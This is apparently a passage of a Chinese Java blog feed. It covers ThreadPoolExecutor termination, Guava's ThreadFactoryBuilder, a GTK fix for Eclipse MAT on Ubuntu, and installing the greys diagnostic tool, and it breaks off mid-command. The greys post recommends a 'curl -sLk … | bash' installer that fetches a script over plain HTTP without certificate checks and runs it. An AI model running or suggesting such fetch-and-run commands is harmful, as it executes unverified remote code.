interruptIdleWorkers, which avoids</span></span><br><span class="line"><span class="comment"> * unnecessary interrupt storms, especially during shutdown.</span></span><br><span class="line"><span class="comment"> * Otherwise exiting threads would concurrently interrupt those</span></span><br><span class="line"><span class="comment"> * that have not yet interrupted. It also simplifies some of the</span></span><br><span class="line"><span class="comment"> * associated statistics bookkeeping of largestPoolSize etc. We</span></span><br><span class="line"><span class="comment"> * also hold mainLock on shutdown and shutdownNow, for the sake of</span></span><br><span class="line"><span class="comment"> * ensuring workers set is stable while separately checking</span></span><br><span class="line"><span class="comment"> * permission to interrupt and actually interrupting.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Wait condition to support awaitTermination</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Condition termination = mainLock.newCondition();</span><br></pre></td></tr></table></figure><p>线程池在退出的时候会唤醒等待在这个队列上的线程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">tryTerminate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="keyword">int</span> c = ctl.get();</span><br><span class="line">            <span class="keyword">if</span> (isRunning(c) ||</span><br><span class="line">                runStateAtLeast(c, TIDYING) ||</span><br><span class="line">                (runStateOf(c) == SHUTDOWN &amp;&amp; ! workQueue.isEmpty()))</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">if</span> (workerCountOf(c) != <span class="number">0</span>) &#123; <span class="comment">// Eligible to terminate</span></span><br><span class="line">                interruptIdleWorkers(ONLY_ONE);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">            mainLock.lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ctl.compareAndSet(c, ctlOf(TIDYING, <span class="number">0</span>))) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        terminated();</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        ctl.set(ctlOf(TERMINATED, <span class="number">0</span>));</span><br><span class="line">                        termination.signalAll(); <span class="comment">// 唤醒等待在这个条件上的线程</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                mainLock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// else retry on failed CAS</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>线程池状态:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * The run state of this task, initially NEW.  The run state</span></span><br><span class="line"><span class="comment">    * transitions to a terminal state only in methods set,</span></span><br><span class="line"><span class="comment">    * setException, and cancel.  During completion, state may take on</span></span><br><span class="line"><span class="comment">    * transient values of COMPLETING (while outcome is being set) or</span></span><br><span class="line"><span class="comment">    * INTERRUPTING (only while interrupting the runner to satisfy a</span></span><br><span class="line"><span class="comment">    * cancel(true)). Transitions from these intermediate to final</span></span><br><span class="line"><span class="comment">    * states use cheaper ordered/lazy writes because values are unique</span></span><br><span class="line"><span class="comment">    * and cannot be further modified.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * Possible state transitions:</span></span><br><span class="line"><span class="comment">    * NEW -&gt; COMPLETING -&gt; NORMAL</span></span><br><span class="line"><span class="comment">    * NEW -&gt; COMPLETING -&gt; EXCEPTIONAL</span></span><br><span class="line"><span class="comment">    * NEW -&gt; CANCELLED</span></span><br><span class="line"><span class="comment">    * NEW -&gt; INTERRUPTING -&gt; INTERRUPTED</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">int</span> state;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> NEW          = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> COMPLETING   = <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> NORMAL       = <span class="number">2</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> EXCEPTIONAL  = <span class="number">3</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CANCELLED    = <span class="number">4</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> INTERRUPTING = <span class="number">5</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> INTERRUPTED  = <span class="number">6</span>;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="http://cdn2.jianshu.io/p/c079d59ba7c8" rel="external nofollow noopener noreferrer" target="_blank">拆轮子：全面剖析 ThreadPoolExecutor（2）-众人拾柴 - 简书</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;shutdown-和shutdownNow&quot;&gt;&lt;a href=&quot;#shutdown-和shutdownNow&quot; class=&quot;headerlink&quot; title=&quot;shutdown()和shutdownNow()&quot;&gt;&lt;/a&gt;shutdown()和shutdownN
      
    
    </summary>
    
      <category term="java" scheme="http://qsli.github.io/categories/java/"/>
    
    
      <category term="executor" scheme="http://qsli.github.io/tags/executor/"/>
    
  </entry>
  
  <entry>
    <title>Guava中的ThreadFactoryBuilder</title>
    <link href="http://qsli.github.io/2017/11/18/ThreadFactoryBuilder/"/>
    <id>http://qsli.github.io/2017/11/18/ThreadFactoryBuilder/</id>
    <published>2017-11-18T09:15:34.000Z</published>
    <updated>2018-08-11T12:42:42.776Z</updated>
    
    <content type="html"><![CDATA[<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>java中自定义线程池时可以传入一个<code>ThreadFactory</code>，用来创建线程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Creates a new &#123;<span class="doctag">@code</span> ThreadPoolExecutor&#125; with the given initial</span></span><br><span class="line"><span class="comment">    * parameters and default rejected execution handler.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> corePoolSize the number of threads to keep in the pool, even</span></span><br><span class="line"><span class="comment">    *        if they are idle, unless &#123;<span class="doctag">@code</span> allowCoreThreadTimeOut&#125; is set</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> maximumPoolSize the maximum number of threads to allow in the</span></span><br><span class="line"><span class="comment">    *        pool</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> keepAliveTime when the number of threads is greater than</span></span><br><span class="line"><span class="comment">    *        the core, this is the maximum time that excess idle threads</span></span><br><span class="line"><span class="comment">    *        will wait for new tasks before terminating.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> unit the time unit for the &#123;<span class="doctag">@code</span> keepAliveTime&#125; argument</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> workQueue the queue to use for holding tasks before they are</span></span><br><span class="line"><span class="comment">    *        executed.  This queue will hold only the &#123;<span class="doctag">@code</span> Runnable&#125;</span></span><br><span class="line"><span class="comment">    *        tasks submitted by the &#123;<span class="doctag">@code</span> execute&#125; method.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> threadFactory the factory to use when the executor</span></span><br><span class="line"><span class="comment">    *        creates a new thread</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> IllegalArgumentException if one of the following holds:&lt;br&gt;</span></span><br><span class="line"><span class="comment">    *         &#123;<span class="doctag">@code</span> corePoolSize &lt; 0&#125;&lt;br&gt;</span></span><br><span class="line"><span class="comment">    *         &#123;<span class="doctag">@code</span> keepAliveTime &lt; 0&#125;&lt;br&gt;</span></span><br><span class="line"><span class="comment">    *         &#123;<span class="doctag">@code</span> maximumPoolSize &lt;= 0&#125;&lt;br&gt;</span></span><br><span class="line"><span class="comment">    *         &#123;<span class="doctag">@code</span> maximumPoolSize &lt; corePoolSize&#125;</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> NullPointerException if &#123;<span class="doctag">@code</span> workQueue&#125;</span></span><br><span class="line"><span class="comment">    *         or &#123;<span class="doctag">@code</span> threadFactory&#125; is null</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">ThreadPoolExecutor</span><span class="params">(<span class="keyword">int</span> corePoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">int</span> maximumPoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">long</span> keepAliveTime,</span></span></span><br><span class="line"><span class="function"><span class="params">                             TimeUnit unit,</span></span></span><br><span class="line"><span class="function"><span class="params">                             BlockingQueue&lt;Runnable&gt; workQueue,</span></span></span><br><span class="line"><span class="function"><span class="params">                             ThreadFactory threadFactory)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">this</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue,</span><br><span class="line">            threadFactory, defaultHandler);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>ThreadFactory</code>接口只有一个方法，就是创建线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ThreadFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructs a new &#123;<span class="doctag">@code</span> Thread&#125;.  Implementations may also initialize</span></span><br><span class="line"><span class="comment">     * priority, name, daemon status, &#123;<span class="doctag">@code</span> ThreadGroup&#125;, etc.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> r a runnable to be executed by new thread instance</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> constructed thread, or &#123;<span class="doctag">@code</span> null&#125; if the request to</span></span><br><span class="line"><span class="comment">     *         create a thread is rejected</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">Thread <span class="title">newThread</span><span class="params">(Runnable r)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建<code>Thread</code>时可以设置一些列的属性， 属性比较多，于是<code>guava</code>里有一个便利类 ———— <code>ThreadFactoryBuilder</code>。</p><p>直接看<code>build</code>方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> ThreadFactory <span class="title">build</span><span class="params">(ThreadFactoryBuilder builder)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> String nameFormat = builder.nameFormat;</span><br><span class="line">    <span class="keyword">final</span> Boolean daemon = builder.daemon;</span><br><span class="line">    <span class="keyword">final</span> Integer priority = builder.priority;</span><br><span class="line">    <span class="keyword">final</span> UncaughtExceptionHandler uncaughtExceptionHandler =</span><br><span class="line">        builder.uncaughtExceptionHandler;</span><br><span class="line">    <span class="keyword">final</span> ThreadFactory backingThreadFactory =</span><br><span class="line">        (builder.backingThreadFactory != <span class="keyword">null</span>)</span><br><span class="line">        ? builder.backingThreadFactory</span><br><span class="line">        : Executors.defaultThreadFactory();</span><br><span class="line">    <span class="keyword">final</span> AtomicLong count = (nameFormat != <span class="keyword">null</span>) ? <span class="keyword">new</span> AtomicLong(<span class="number">0</span>) : <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ThreadFactory() &#123;</span><br><span class="line">      <span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> Thread <span class="title">newThread</span><span class="params">(Runnable runnable)</span> </span>&#123;</span><br><span class="line">        Thread thread = backingThreadFactory.newThread(runnable);</span><br><span class="line">        <span class="keyword">if</span> (nameFormat != <span class="keyword">null</span>) &#123;</span><br><span class="line">          thread.setName(format(nameFormat, count.getAndIncrement()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (daemon != <span class="keyword">null</span>) &#123;</span><br><span class="line">          thread.setDaemon(daemon);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (priority != <span class="keyword">null</span>) &#123;</span><br><span class="line">          thread.setPriority(priority);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (uncaughtExceptionHandler != <span class="keyword">null</span>) &#123;</span><br><span class="line">          thread.setUncaughtExceptionHandler(uncaughtExceptionHandler);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> thread;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>使用起来挺顺手的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ThreadPoolExecutor executor = <span class="keyword">new</span> ThreadPoolExecutor(</span><br><span class="line">          <span class="number">10</span>,</span><br><span class="line">          <span class="number">15</span>,</span><br><span class="line">          <span class="number">10</span>,</span><br><span class="line">          TimeUnit.SECONDS,</span><br><span class="line">          blockingQueue,</span><br><span class="line">          <span class="keyword">new</span> ThreadFactoryBuilder().setNameFormat(<span class="string">"guava-%d"</span>).build(),</span><br><span class="line">          <span class="keyword">new</span> ThreadPoolExecutor.DiscardPolicy()</span><br><span class="line">  );</span><br></pre></td></tr></table></figure><p>主要就是给线程整一个名字，用<code>jstack</code>等工具排查问题时方便知道是哪个线程池里的。</p><p><code>jstack</code>的结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&quot;guava-9&quot; #19 prio=5 os_prio=0 tid=0x00007f5024468000 nid=0x5e3b waiting on condition [0x00007f50104f7000]</span><br><span class="line">   java.lang.Thread.State: WAITING (parking)</span><br><span class="line">        at sun.misc.Unsafe.park(Native Method)</span><br><span class="line">        - parking to wait for  &lt;0x00000000d709af38&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)</span><br><span class="line">        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)</span><br><span class="line">        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)</span><br><span class="line">        at java.util.concurrent.ArrayBlockingQueue.take(ArrayBlockingQueue.java:403)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:745)</span><br></pre></td></tr></table></figure><h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><ol><li><a href="http://www.importnew.com/20263.html" rel="external nofollow noopener noreferrer" target="_blank">ExecutorService-10个要诀和技巧 - ImportNew</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;用法&quot;&gt;&lt;a href=&quot;#用法&quot; class=&quot;headerlink&quot; title=&quot;用法&quot;&gt;&lt;/a&gt;用法&lt;/h2&gt;&lt;p&gt;java中自定义线程池时可以传入一个&lt;code&gt;ThreadFactory&lt;/code&gt;，用来创建线程。&lt;/p&gt;
&lt;figure class
      
    
    </summary>
    
      <category term="guava" scheme="http://qsli.github.io/categories/guava/"/>
    
    
      <category term="concurrent" scheme="http://qsli.github.io/tags/concurrent/"/>
    
  </entry>
  
  <entry>
    <title>MAT-Ubuntu无法打开Report</title>
    <link href="http://qsli.github.io/2017/11/12/MAT-Ubuntu/"/>
    <id>http://qsli.github.io/2017/11/12/MAT-Ubuntu/</id>
    <published>2017-11-12T10:57:04.000Z</published>
    <updated>2018-08-11T12:42:42.263Z</updated>
    
    <content type="html"><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>可以运行<code>Leak Suspects</code>，可以看到报告文件确实生成了，但是无法打开，看error log如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Unhandled event loop exception</span><br><span class="line"></span><br><span class="line">org.eclipse.swt.SWTException: Failed to execute runnable (org.eclipse.swt.SWTError: No more handles [Browser style SWT.MOZILLA and Java system property org.eclipse.swt.browser.DefaultType=mozilla are not supported with GTK 3 as XULRunner is not ported for GTK 3 yet])</span><br><span class="line">at org.eclipse.swt.SWT.error(SWT.java:4491)</span><br><span class="line">at org.eclipse.swt.SWT.error(SWT.java:4406)</span><br><span class="line">at org.eclipse.swt.widgets.Synchronizer.runAsyncMessages(Synchronizer.java:138)</span><br><span class="line">at org.eclipse.swt.widgets.Display.runAsyncMessages(Display.java:3794)</span><br><span class="line">at org.eclipse.swt.widgets.Display.readAndDispatch(Display.java:3433)</span><br><span class="line">at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine$4.run(PartRenderingEngine.java:1127)</span><br><span class="line">at org.eclipse.core.databinding.observable.Realm.runWithDefault(Realm.java:337)</span><br><span class="line">at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.run(PartRenderingEngine.java:1018)</span><br><span class="line">at org.eclipse.e4.ui.internal.workbench.E4Workbench.createAndRunUI(E4Workbench.java:156)</span><br><span class="line">at org.eclipse.ui.internal.Workbench$5.run(Workbench.java:694)</span><br><span class="line">at org.eclipse.core.databinding.observable.Realm.runWithDefault(Realm.java:337)</span><br><span class="line">at org.eclipse.ui.internal.Workbench.createAndRunWorkbench(Workbench.java:606)</span><br><span class="line">at org.eclipse.ui.PlatformUI.createAndRunWorkbench(PlatformUI.java:150)</span><br><span class="line">at org.eclipse.mat.ui.rcp.Application.start(Application.java:26)</span><br><span class="line">at org.eclipse.equinox.internal.app.EclipseAppHandle.run(EclipseAppHandle.java:196)</span><br><span class="line">at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.runApplication(EclipseAppLauncher.java:134)</span><br><span class="line">at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.start(EclipseAppLauncher.java:104)</span><br><span class="line">at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:380)</span><br><span class="line">at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:235)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">at org.eclipse.equinox.launcher.Main.invokeFramework(Main.java:669)</span><br><span class="line">at org.eclipse.equinox.launcher.Main.basicRun(Main.java:608)</span><br><span class="line">at org.eclipse.equinox.launcher.Main.run(Main.java:1515)</span><br><span class="line">at org.eclipse.equinox.launcher.Main.main(Main.java:1488)</span><br><span class="line">Caused by: org.eclipse.swt.SWTError: No more handles [Browser style SWT.MOZILLA and Java system property org.eclipse.swt.browser.DefaultType=mozilla are not supported with GTK 3 as XULRunner is not ported for GTK 3 yet]</span><br><span class="line">at org.eclipse.swt.SWT.error(SWT.java:4517)</span><br><span class="line">at org.eclipse.swt.browser.MozillaDelegate.&lt;init&gt;(MozillaDelegate.java:57)</span><br><span class="line">at org.eclipse.swt.browser.Mozilla.create(Mozilla.java:663)</span><br><span class="line">at org.eclipse.swt.browser.Browser.&lt;init&gt;(Browser.java:99)</span><br><span class="line">at org.eclipse.mat.ui.internal.panes.QueryTextResultPane.createPartControl(QueryTextResultPane.java:72)</span><br><span class="line">at org.eclipse.mat.ui.editor.MultiPaneEditor.addPage(MultiPaneEditor.java:585)</span><br><span class="line">at org.eclipse.mat.ui.editor.MultiPaneEditor.addPage(MultiPaneEditor.java:574)</span><br><span class="line">at org.eclipse.mat.ui.editor.MultiPaneEditor.addNewPage(MultiPaneEditor.java:496)</span><br><span class="line">at org.eclipse.mat.ui.QueryExecution.doDisplayResult(QueryExecution.java:300)</span><br><span class="line">at org.eclipse.mat.ui.QueryExecution.access$0(QueryExecution.java:240)</span><br><span class="line">at org.eclipse.mat.ui.QueryExecution$1.run(QueryExecution.java:144)</span><br><span class="line">at org.eclipse.swt.widgets.RunnableLock.run(RunnableLock.java:35)</span><br><span class="line">at org.eclipse.swt.widgets.Synchronizer.runAsyncMessages(Synchronizer.java:135)</span><br><span class="line">... 24 more</span><br></pre></td></tr></table></figure><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>这个是<code>gtk</code>的问题。</p><p>添加<code>--launcher.GTK_version</code>和<code>2</code>到<code>MemoryAnalyzer.ini</code>文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-startup</span><br><span class="line">plugins/org.eclipse.equinox.launcher_1.3.100.v20150511-1540.jar</span><br><span class="line">--launcher.library</span><br><span class="line">plugins/org.eclipse.equinox.launcher.gtk.linux.x86_64_1.1.300.v20150602-1417</span><br><span class="line">--launcher.GTK_version</span><br><span class="line">2</span><br><span class="line">-vmargs</span><br><span class="line">-Xmx1024m</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://askubuntu.com/questions/761604/eclipse-not-working-in-16-04" rel="external nofollow noopener noreferrer" target="_blank">Eclipse not working in 16.04 - Ask Ubuntu</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;现象&quot;&gt;&lt;a href=&quot;#现象&quot; class=&quot;headerlink&quot; title=&quot;现象&quot;&gt;&lt;/a&gt;现象&lt;/h2&gt;&lt;p&gt;可以运行&lt;code&gt;Leak Suspects&lt;/code&gt;，可以看到报告文件确实生成了，但是无法打开，看error log如下:&lt;/p&gt;

      
    
    </summary>
    
      <category term="java" scheme="http://qsli.github.io/categories/java/"/>
    
    
      <category term="mat" scheme="http://qsli.github.io/tags/mat/"/>
    
  </entry>
  
  <entry>
    <title>使用greys来排查线上问题</title>
    <link href="http://qsli.github.io/2017/11/12/greys/"/>
    <id>http://qsli.github.io/2017/11/12/greys/</id>
    <published>2017-11-12T10:10:12.000Z</published>
    <updated>2018-08-11T12:42:41.614Z</updated>
    
    <content type="html"><![CDATA[<h2 id="greys"><a href="#greys" class="headerlink" title="greys"></a>greys</h2><p>greys的理念是将btrace常用的功能命令化，这样可以大大的节省排查问题的时间。</p><h3 id="greys-安装"><a href="#greys-安装" class="headerlink" title="greys 安装"></a>greys 安装</h3><p>推荐使用网络安装:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sLk http://ompc.oss.aliyuncs.com/greys/install.sh|bash</span><br></pre></td></tr></table></figure><p>安装后家目录下有如下的文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/home/qishengli/.greys</span><br><span class="line">└── lib</span><br><span class="line">    └── 1.7.6.4</span><br><span class="line">        ├── greys</span><br><span class="line">        │   ├── ga.sh</span><br><span class="line">        │   ├── greys-agent.jar</span><br><span class="line">        │   ├── greys-core.jar</span><br><span class="line">        │   ├── greys.sh</span><br><span class="line">        │   ├── gs.sh</span><br><span class="line">        │   └── install-local.sh</span><br><span class="line">        └── greys-1.7.6.4-bin.zip</span><br></pre></td></tr></table></figure><blockquote><p>其中greys-core.jar为greys的程序主体，启动类、加载类都在这个jar包当中；<br>greys-agent.jar则为目标JVM的加载引导程序；<br>greys.sh为一个可执行脚本，为Greys的启动脚本。</p></blockquote><h3 id="greys常用功能"><a href="#greys常用功能" class="headerlink" title="greys常用功能"></a>greys常用功能</h3><p>启动脚本，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u tomcat 